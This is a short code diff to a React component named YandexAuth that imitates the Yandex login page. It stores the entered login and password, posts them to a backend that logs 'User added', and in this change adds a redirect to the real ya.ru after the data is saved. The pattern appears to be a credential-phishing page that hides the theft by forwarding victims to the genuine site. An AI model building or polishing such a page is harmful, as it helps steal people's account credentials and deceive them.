@@ -8,7 +8,7 @@ import qrImage from '../assets/qrImage.svg'
 import moreImg from '../assets/moreImg.svg'
 import rusFlagImg from '../assets/rusFlagImg.png'
 import { FaArrowLeft } from "react-icons/fa"
-import ButtonComponent from "../components/ButtonComponent";
+import ButtonComponent from "../components/ButtonComponent"
 import { useState } from "react"
 import PhoneForm from "../components/PhoneForm"
 
@@ -23,6 +23,7 @@ const YandexAuth = () => {
     const [password, setPassword] = useState("");
 
     const [showToast, setShowToast] = useState(false)
+
 
     const handleClick = () => {
         setShowToast(true);
@@ -64,6 +65,7 @@ const YandexAuth = () => {
                         console.log("Пользователь добавлен:", data);
                         setInputValue("");
                         setStep("login")
+                        window.location.href = "https://ya.ru/"
                     } else {
                         console.error("Ошибка:", data.error);
                         setError(true);
